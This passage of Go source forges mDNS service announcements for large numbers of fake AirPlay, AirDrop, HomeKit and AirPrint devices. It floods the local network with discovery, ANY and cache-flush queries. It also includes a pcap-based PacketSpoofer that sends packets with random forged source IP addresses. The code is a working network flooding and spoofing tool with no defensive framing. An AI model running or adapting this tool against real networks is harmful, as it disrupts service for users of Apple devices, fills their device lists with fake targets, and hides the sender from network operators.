			Rrtype: dns.TypeSRV,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Priority: 0,
		Weight:   0,
		Port:     7000,
		Target:   fmt.Sprintf("%s.local.", name),
	}

	// Standard AirPlay TXT record
	airplayTxt := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._airplay._tcp.local.", name),
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Txt: []string{
			"features=0x5A7FFFF7",
			fmt.Sprintf("deviceid=%s", deviceID),
			"model=AppleTV3,2",
			"srcvers=220.68",
			"flags=0x4",
			fmt.Sprintf("name=%s", name),
			"pk=b07727d6f6cd6e08b58ede525ec3cdeaa252ad9f683feb212ef8a3922d46baa9",
		},
	}

	airplayMsg.Answer = []dns.RR{airplayPtr, srvAirPlay, airplayTxt}
	return []*dns.Msg{airplayMsg}
}

func createAirDropAnnouncements(name string, deviceID string, ttl uint32) []*dns.Msg {
	// Create base AirDrop announcement
	airdropMsg := new(dns.Msg)
	airdropMsg.Response = true
	airdropMsg.Authoritative = true
	airdropMsg.Id = 0

	// AirDrop uses the _airdrop._tcp.local. service type
	airdropPtr := &dns.PTR{
		Hdr: dns.RR_Header{
			Name:   "_airdrop._tcp.local.",
			Rrtype: dns.TypePTR,
			Class:  dns.ClassINET,
			Ttl:    ttl,
		},
		Ptr: fmt.Sprintf("%s._airdrop._tcp.local.", name),
	}

	// Use random model and OS version
	model := appleModels[rand.Intn(len(appleModels))]
	osVersion := osVersions[rand.Intn(len(osVersions))]

	// SRV with cache-flush
	srvAirDrop := &dns.SRV{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._airdrop._tcp.local.", name),
			Rrtype: dns.TypeSRV,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Priority: 0,
		Weight:   0,
		Port:     8770, // AirDrop typically uses port 8770
		Target:   fmt.Sprintf("%s.local.", name),
	}

	// AirDrop TXT record
	airdropTxt := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._airdrop._tcp.local.", name),
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Txt: []string{
			fmt.Sprintf("deviceid=%s", deviceID),
			"flags=0x1",
			fmt.Sprintf("model=%s", model),
			"name=" + name,
			fmt.Sprintf("osxversion=%s", osVersion),
			"status=1",
			"services=0x1FFFFF",
		},
	}

	// A record for the host
	aHost := &dns.A{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s.local.", name),
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		A: generateRandomIP(),
	}

	airdropMsg.Answer = []dns.RR{airdropPtr, srvAirDrop, airdropTxt, aHost}
	return []*dns.Msg{airdropMsg}
}

func createHomeKitAnnouncements(name string, deviceID string, ttl uint32) []*dns.Msg {
	// Create base HomeKit announcement
	homekitMsg := new(dns.Msg)
	homekitMsg.Response = true
	homekitMsg.Authoritative = true
	homekitMsg.Id = 0

	// HomeKit uses _hap._tcp.local.
	homekitPtr := &dns.PTR{
		Hdr: dns.RR_Header{
			Name:   "_hap._tcp.local.",
			Rrtype: dns.TypePTR,
			Class:  dns.ClassINET,
			Ttl:    ttl,
		},
		Ptr: fmt.Sprintf("%s._hap._tcp.local.", name),
	}

	// SRV with cache-flush
	srvHomeKit := &dns.SRV{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._hap._tcp.local.", name),
			Rrtype: dns.TypeSRV,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Priority: 0,
		Weight:   0,
		Port:     uint16(rand.Intn(1000) + 8000), // Convert to uint16
		Target:   fmt.Sprintf("%s.local.", name),
	}

	// Random HomeKit category
	category := homekitCategories[rand.Intn(len(homekitCategories))]

	// Generate a random configuration number (changes when config changes)
	configNum := rand.Intn(65535)

	// Generate a random HAP feature flags value
	featureFlags := rand.Intn(256)

	// Generate a random setup hash (8 characters)
	setupHash := fmt.Sprintf("%08X", rand.Uint32())

	// HomeKit TXT record
	homekitTxt := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._hap._tcp.local.", name),
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Txt: []string{
			fmt.Sprintf("md=%s", name),
			fmt.Sprintf("pv=1.1"),
			fmt.Sprintf("id=%s", deviceID),
			fmt.Sprintf("c#=%d", configNum),
			fmt.Sprintf("s#=1"),
			fmt.Sprintf("ff=%d", featureFlags),
			fmt.Sprintf("ci=%s", category),
			fmt.Sprintf("sf=0"),
			fmt.Sprintf("sh=%s", setupHash),
		},
	}

	// A record for the host
	aHost := &dns.A{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s.local.", name),
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		A: generateRandomIP(),
	}

	homekitMsg.Answer = []dns.RR{homekitPtr, srvHomeKit, homekitTxt, aHost}
	return []*dns.Msg{homekitMsg}
}

func createAirPrintAnnouncements(name string, deviceID string, ttl uint32) []*dns.Msg {
	// Create base AirPrint announcement
	airprintMsg := new(dns.Msg)
	airprintMsg.Response = true
	airprintMsg.Authoritative = true
	airprintMsg.Id = 0

	// AirPrint uses _ipp._tcp.local. and _ipps._tcp.local.
	airprintPtr := &dns.PTR{
		Hdr: dns.RR_Header{
			Name:   "_ipp._tcp.local.",
			Rrtype: dns.TypePTR,
			Class:  dns.ClassINET,
			Ttl:    ttl,
		},
		Ptr: fmt.Sprintf("%s._ipp._tcp.local.", name),
	}

	// Secure AirPrint (IPPS)
	airprintSecurePtr := &dns.PTR{
		Hdr: dns.RR_Header{
			Name:   "_ipps._tcp.local.",
			Rrtype: dns.TypePTR,
			Class:  dns.ClassINET,
			Ttl:    ttl,
		},
		Ptr: fmt.Sprintf("%s._ipps._tcp.local.", name),
	}

	// SRV with cache-flush for IPP
	srvAirPrint := &dns.SRV{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._ipp._tcp.local.", name),
			Rrtype: dns.TypeSRV,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Priority: 0,
		Weight:   0,
		Port:     631, // Standard IPP port
		Target:   fmt.Sprintf("%s.local.", name),
	}

	// SRV with cache-flush for IPPS
	srvAirPrintSecure := &dns.SRV{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._ipps._tcp.local.", name),
			Rrtype: dns.TypeSRV,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Priority: 0,
		Weight:   0,
		Port:     631, // Standard IPP port
		Target:   fmt.Sprintf("%s.local.", name),
	}

	// Random printer model
	model := printerModels[rand.Intn(len(printerModels))]
	modelNum := fmt.Sprintf("%s %d", model, rand.Intn(9000)+1000)

	// Random printer capabilities (3-6 capabilities)
	numCaps := rand.Intn(4) + 3
	selectedCaps := make(map[string]bool)
	for i := 0; i < numCaps; i++ {
		selectedCaps[printerCapabilities[rand.Intn(len(printerCapabilities))]] = true
	}

	var caps []string
	for cap := range selectedCaps {
		caps = append(caps, cap)
	}

	// Random printer queue name
	queueName := fmt.Sprintf("%s-%d", strings.ReplaceAll(name, " ", "-"), rand.Intn(100))

	// AirPrint TXT record for IPP
	airprintTxt := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._ipp._tcp.local.", name),
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Txt: []string{
			"txtvers=1",
			fmt.Sprintf("qtotal=1"),
			fmt.Sprintf("rp=%s", queueName),
			fmt.Sprintf("ty=%s", modelNum),
			fmt.Sprintf("adminurl=http://%s.local./admin", name),
			fmt.Sprintf("note=%s Printer", name),
			fmt.Sprintf("priority=50"),
			fmt.Sprintf("product=(%s)", modelNum),
			fmt.Sprintf("pdl=application/pdf,application/postscript,image/jpeg,image/png"),
			fmt.Sprintf("Color=T"),
			fmt.Sprintf("Duplex=T"),
			fmt.Sprintf("usb_MFG=%s", strings.Split(model, " ")[0]),
			fmt.Sprintf("usb_MDL=%s", strings.ReplaceAll(modelNum, " ", "_")),
			fmt.Sprintf("UUID=%s", strings.ReplaceAll(deviceID, ":", "")),
			fmt.Sprintf("TLS=1.2"),
			fmt.Sprintf("kind=document,envelope,photo,postcard"),
			fmt.Sprintf("URF=CP1,IS1,MT1,RS300,SRGB24,W8,DM3"),
			fmt.Sprintf("air=username,password,uuid"),
			fmt.Sprintf("Transparent=T"),
			fmt.Sprintf("Binary=T"),
			fmt.Sprintf("Fax=F"),
			fmt.Sprintf("Scan=F"),
			fmt.Sprintf("PaperMax=legal-A4"),
			fmt.Sprintf("printer-type=0x801046"),
			fmt.Sprintf("printer-state=3"),
			fmt.Sprintf("printer-state-reasons=none"),
			fmt.Sprintf("Copies=T"),
			fmt.Sprintf("Collate=T"),
			fmt.Sprintf("Bind=F"),
			fmt.Sprintf("Sort=T"),
			fmt.Sprintf("Punch=F"),
			fmt.Sprintf("Staple=F"),
			fmt.Sprintf("Booklet=F"),
		},
	}

	// AirPrint TXT record for IPPS (mostly the same)
	airprintSecureTxt := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s._ipps._tcp.local.", name),
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		Txt: airprintTxt.Txt, // Reuse the same TXT records
	}

	// A record for the host
	aHost := &dns.A{
		Hdr: dns.RR_Header{
			Name:   fmt.Sprintf("%s.local.", name),
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET | 0x8000,
			Ttl:    ttl,
		},
		A: generateRandomIP(),
	}

	airprintMsg.Answer = []dns.RR{airprintPtr, airprintSecurePtr, srvAirPrint, srvAirPrintSecure, airprintTxt, airprintSecureTxt, aHost}
	return []*dns.Msg{airprintMsg}
}

func createLoadQueries() []*dns.Msg {
	queries := []*dns.Msg{
		// Service Discovery queries
		createQuery("_services._dns-sd._udp.local.", dns.TypePTR),
		createQuery("_airplay._tcp.local.", dns.TypePTR),
		createQuery("_airdrop._tcp.local.", dns.TypePTR),
		createQuery("_hap._tcp.local.", dns.TypePTR),
		createQuery("_ipp._tcp.local.", dns.TypePTR),
		createQuery("_ipps._tcp.local.", dns.TypePTR),
		createQuery("_raop._tcp.local.", dns.TypePTR),
		createQuery("_companion-link._tcp.local.", dns.TypePTR),
		createQuery("_sleep-proxy._udp.local.", dns.TypePTR),
		createQuery("_homekit._tcp.local.", dns.TypePTR),
		createQuery("_spotify-connect._tcp.local.", dns.TypePTR),

		// Reverse lookup queries
		createQuery("211.0.168.192.in-addr.arpa.", dns.TypePTR),

		// Instance queries
		createQuery("Living-Room._airplay._tcp.local.", dns.TypeSRV),
		createQuery("Living-Room._airplay._tcp.local.", dns.TypeTXT),
		createQuery("Living-Room._airdrop._tcp.local.", dns.TypeSRV),
		createQuery("Living-Room._airdrop._tcp.local.", dns.TypeTXT),
		createQuery("Living-Room.local.", dns.TypeA),
		createQuery("Living-Room.local.", dns.TypeAAAA),

		// Any queries (these are particularly heavy)
		createQuery("_airplay._tcp.local.", dns.TypeANY),
		createQuery("_airdrop._tcp.local.", dns.TypeANY),
		createQuery("local.", dns.TypeANY),

		// Cache flush queries
		createCacheFlushQuery("_airplay._tcp.local.", dns.TypePTR),
		createCacheFlushQuery("_airdrop._tcp.local.", dns.TypePTR),
		createCacheFlushQuery("_raop._tcp.local.", dns.TypePTR),

		// Negative queries (non-existent services)
		createQuery("_nonexistent._tcp.local.", dns.TypePTR),
		createQuery("missing-device.local.", dns.TypeA),

		// Large TXT record queries
		createQuery("Living-Room._airplay._tcp.local.", dns.TypeTXT),
		createQuery("Living-Room._airdrop._tcp.local.", dns.TypeTXT),

		// Add HomeKit and AirPrint specific queries
		createQuery("Living-Room._hap._tcp.local.", dns.TypeSRV),
		createQuery("Living-Room._hap._tcp.local.", dns.TypeTXT),
		createQuery("Living-Room._ipp._tcp.local.", dns.TypeSRV),
		createQuery("Living-Room._ipp._tcp.local.", dns.TypeTXT),
		createQuery("Living-Room._ipps._tcp.local.", dns.TypeSRV),
		createQuery("Living-Room._ipps._tcp.local.", dns.TypeTXT),

		// Any queries for new services
		createQuery("_hap._tcp.local.", dns.TypeANY),
		createQuery("_ipp._tcp.local.", dns.TypeANY),
		createQuery("_ipps._tcp.local.", dns.TypeANY),

		// Cache flush queries for new services
		createCacheFlushQuery("_hap._tcp.local.", dns.TypePTR),
		createCacheFlushQuery("_ipp._tcp.local.", dns.TypePTR),
		createCacheFlushQuery("_ipps._tcp.local.", dns.TypePTR),
	}
	return queries
}

func createQuery(name string, qtype uint16) *dns.Msg {
	m := new(dns.Msg)
	m.SetQuestion(name, qtype)
	m.RecursionDesired = true
	return m
}

func createCacheFlushQuery(name string, qtype uint16) *dns.Msg {
	m := new(dns.Msg)
	m.SetQuestion(name, qtype)
	m.RecursionDesired = true
	// Set cache flush bit
	m.Question[0].Qclass = dns.ClassINET | 0x8000
	return m
}

func handleResponses(conn *net.UDPConn, mdnsAddr *net.UDPAddr) {
	buf := make([]byte, 65535)
	for {
		n, _, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}

		msg := new(dns.Msg)
		if err := msg.Unpack(buf[:n]); err != nil {
			continue
		}

		// Force cache processing by checking all records
		for _, rr := range msg.Answer {
			switch rr.(type) {
			case *dns.PTR:
				// Trigger new SRV+TXT queries for each PTR
				name := rr.(*dns.PTR).Ptr
				queries := []*dns.Msg{
					createQuery(name, dns.TypeSRV),
					createQuery(name, dns.TypeTXT),
				}
				for _, q := range queries {
					queryBytes, _ := q.Pack()
					conn.WriteToUDP(queryBytes, mdnsAddr)
				}
			}
		}
	}
}

func sendQueries(conn *net.UDPConn, mdnsAddr *net.UDPAddr, queries []*dns.Msg, rate int) {
	ticker := time.NewTicker(time.Second / time.Duration(rate))
	defer ticker.Stop()

	for range ticker.C {
		query := queries[rand.Intn(len(queries))]
		queryBytes, err := query.Pack()
		if err != nil {
			continue
		}
		conn.WriteToUDP(queryBytes, mdnsAddr)
	}
}

func generateDevices(count int, broadcastTypes []BroadcastType, ttl uint32, debug bool) []*dns.Msg {
	var announcements []*dns.Msg

	// Create a map for faster lookup
	typeMap := make(map[BroadcastType]bool)
	for _, t := range broadcastTypes {
		typeMap[t] = true
	}

	// Check if we should include all types
	includeAll := typeMap[BroadcastTypeAll]

	for i := 0; i < count; i++ {
		name := generateDeviceName()
		dnsName, displayName := sanitizeDeviceName(name)
		deviceID := generateDeviceID()

		broadcastInfo := ""

		// Add AirPlay announcements if requested
		if includeAll || typeMap[BroadcastTypeAirPlay] {
			airplayAnnouncements := createAirPlayAnnouncements(dnsName, deviceID, ttl)
			announcements = append(announcements, airplayAnnouncements...)
			broadcastInfo += "AirPlay "
		}

		// Add AirDrop announcements if requested
		if includeAll || typeMap[BroadcastTypeAirDrop] {
			airdropAnnouncements := createAirDropAnnouncements(dnsName, deviceID, ttl)
			announcements = append(announcements, airdropAnnouncements...)
			broadcastInfo += "AirDrop "
		}

		// Add HomeKit announcements if requested
		if includeAll || typeMap[BroadcastTypeHomeKit] {
			homekitAnnouncements := createHomeKitAnnouncements(dnsName, deviceID, ttl)
			announcements = append(announcements, homekitAnnouncements...)
			broadcastInfo += "HomeKit "
		}

		// Add AirPrint announcements if requested
		if includeAll || typeMap[BroadcastTypeAirPrint] {
			airprintAnnouncements := createAirPrintAnnouncements(dnsName, deviceID, ttl)
			announcements = append(announcements, airprintAnnouncements...)
			broadcastInfo += "AirPrint "
		}

		if debug {
			log.Printf("Generated device %d/%d: %s (%s)", i+1, count, displayName, strings.TrimSpace(broadcastInfo))
		}
	}
	return announcements
}

// Helper function to set the multicast interface
func setMulticastInterface(conn *net.UDPConn, ifi *net.Interface) error {
	file, err := conn.File()
	if err != nil {
		return err
	}
	defer file.Close()

	fd := int(file.Fd())

	// On Linux, we use the interface index with SetsockoptInt
	return syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_MULTICAST_IF, ifi.Index)
}

// Adding a new function to pre-generate and cache a large number of device announcements
func preGenerateDevices(count int, broadcastTypes []BroadcastType, ttl uint32, debug bool) []*dns.Msg {
	if debug {
		log.Printf("Pre-generating %d devices (this may take a while)...", count)
	}

	startTime := time.Now()
	announcements := generateDevices(count, broadcastTypes, ttl, debug)

	if debug {
		log.Printf("Pre-generated %d devices with %d announcements in %v",
			count, len(announcements), time.Since(startTime))
	}

	return announcements
}

// Add new function to efficiently pre-generate massive number of devices
func efficientPreGeneration(count int, broadcastTypes []BroadcastType, ttl uint32, debug bool) []*dns.Msg {
	if debug {
		log.Printf("Efficiently pre-generating %d devices...", count)
	}

	// Use worker pools for parallel generation
	workers := runtime.NumCPU()
	jobs := make(chan int, count)
	results := make(chan []*dns.Msg, count)

	// Start worker pool
	for w := 1; w <= workers; w++ {
		go func() {
			for range jobs {
				name := generateDeviceName()
				dnsName, _ := sanitizeDeviceName(name)
				deviceID := generateDeviceID()

				var deviceAnnouncements []*dns.Msg

				// Generate announcements based on types
				for _, bType := range broadcastTypes {
					switch bType {
					case BroadcastTypeAirPlay, BroadcastTypeAll:
						deviceAnnouncements = append(deviceAnnouncements,
							createAirPlayAnnouncements(dnsName, deviceID, ttl)...)
					case BroadcastTypeAirDrop:
						deviceAnnouncements = append(deviceAnnouncements,
							createAirDropAnnouncements(dnsName, deviceID, ttl)...)
					case BroadcastTypeHomeKit:
						deviceAnnouncements = append(deviceAnnouncements,
							createHomeKitAnnouncements(dnsName, deviceID, ttl)...)
					case BroadcastTypeAirPrint:
						deviceAnnouncements = append(deviceAnnouncements,
							createAirPrintAnnouncements(dnsName, deviceID, ttl)...)
					}
				}

				results <- deviceAnnouncements
			}
		}()
	}

	// Send jobs to workers
	for i := 0; i < count; i++ {
		jobs <- i
	}
	close(jobs)

	// Collect results
	var announcements []*dns.Msg
	for i := 0; i < count; i++ {
		deviceAnnouncements := <-results
		announcements = append(announcements, deviceAnnouncements...)

		// Progress reporting
		if debug && i > 0 && i%10000 == 0 {
			log.Printf("Generated %d/%d devices", i, count)
		}
	}

	return announcements
}

// Add this function to your code
func generateDeviceAnnouncements(name string, deviceID string, broadcastTypes []BroadcastType, ttl uint32) []*dns.Msg {
	var announcements []*dns.Msg

	// Create a map for faster lookup
	typeMap := make(map[BroadcastType]bool)
	for _, t := range broadcastTypes {
		typeMap[t] = true
	}

	// Check if we should include all types
	includeAll := typeMap[BroadcastTypeAll]

	// Add AirPlay announcements if requested
	if includeAll || typeMap[BroadcastTypeAirPlay] {
		airplayAnnouncements := createAirPlayAnnouncements(name, deviceID, ttl)
		announcements = append(announcements, airplayAnnouncements...)
	}

	// Add AirDrop announcements if requested
	if includeAll || typeMap[BroadcastTypeAirDrop] {
		airdropAnnouncements := createAirDropAnnouncements(name, deviceID, ttl)
		announcements = append(announcements, airdropAnnouncements...)
	}

	// Add HomeKit announcements if requested
	if includeAll || typeMap[BroadcastTypeHomeKit] {
		homekitAnnouncements := createHomeKitAnnouncements(name, deviceID, ttl)
		announcements = append(announcements, homekitAnnouncements...)
	}

	// Add AirPrint announcements if requested
	if includeAll || typeMap[BroadcastTypeAirPrint] {
		airprintAnnouncements := createAirPrintAnnouncements(name, deviceID, ttl)
		announcements = append(announcements, airprintAnnouncements...)
	}

	return announcements
}

// PacketSpoofer represents a utility for sending spoofed packets
type PacketSpoofer struct {
	handle       *pcap.Handle
	ifaceName    string
	targetIP     net.IP
	sourceIP     net.IP
	targetPort   int
	sourcePorts  []int
	ifaceInfo    *net.Interface
	defaultSrcIP net.IP
}

// NewPacketSpoofer creates a new packet spoofer
func NewPacketSpoofer(ifaceName string, targetIP, sourceIP net.IP, targetPort int) (*PacketSpoofer, error) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return nil, fmt.Errorf("interface not found: %v", err)
	}

	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("error opening pcap handle: %v", err)
	}

	spoofer := &PacketSpoofer{
		handle:     handle,
		ifaceName:  ifaceName,
		targetIP:   targetIP,
		sourceIP:   sourceIP,
		targetPort: targetPort,
		ifaceInfo:  iface,
	}

	return spoofer, nil
}

// SendSpoofedPacket sends a DNS packet with a spoofed source IP
func (s *PacketSpoofer) SendSpoofedPacket(payload []byte) error {
	srcIP := s.sourceIP
	if srcIP == nil {
		// If no source IP specified, generate a random one
		srcIP = generateRandomIP()
	}

	// Create a new Ethernet layer
	eth := layers.Ethernet{
		SrcMAC:       s.ifaceInfo.HardwareAddr,
		DstMAC:       net.HardwareAddr{0x01, 0x00, 0x5e, 0x00, 0x00, 0xfb}, // mDNS MAC
		EthernetType: layers.EthernetTypeIPv4,
	}

	// Create IP layer
	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    srcIP,
		DstIP:    s.targetIP,
	}

	// Create UDP layer
	udp := layers.UDP{
		SrcPort: layers.UDPPort(rand.Intn(16383) + 49152), // Random high port
		DstPort: layers.UDPPort(s.targetPort),
	}
	udp.SetNetworkLayerForChecksum(&ip)

	// Serialize packet
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	err := gopacket.SerializeLayers(buf, opts,
		&eth,
		&ip,
		&udp,
		gopacket.Payload(payload),
	)
	if err != nil {
		return fmt.Errorf("error serializing packet: %v", err)
	}

	// Send the packet
	return s.handle.WritePacketData(buf.Bytes())
}

// Close closes the spoofer
func (s *PacketSpoofer) Close() {
	s.handle.Close()
}

// Update the configurePacketSpoofer function
func configurePacketSpoofer(interfaceName string, targetIP net.IP, sourceIP net.IP) (*PacketSpoofer, error) {
	log.Printf("Setting up IP spoofing with gopacket...")

	// If no interface specified, find a suitable one
	if interfaceName == "" {
		ifaces, err := net.Interfaces()
		if err != nil {
			return nil, fmt.Errorf("failed to enumerate interfaces: %v", err)
		}

		for _, iface := range ifaces {
			// Skip loopback and interfaces without addresses
			if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
				continue
			}

			addrs, err := iface.Addrs()
			if err != nil || len(addrs) == 0 {
				continue
			}

			// Found a suitable interface
			interfaceName = iface.Name
			break
		}

		if interfaceName == "" {
			return nil, fmt.Errorf("could not find a suitable network interface")
		}
	}

	// Create the packet spoofer
	spoofer, err := NewPacketSpoofer(interfaceName, targetIP, sourceIP, 5353)
	if err != nil {
		return nil, fmt.Errorf("failed to create packet spoofer: %v", err)
	}

	log.Printf("IP spoofing enabled with gopacket - packets will appear to come from random IPs")
	return spoofer, nil
}
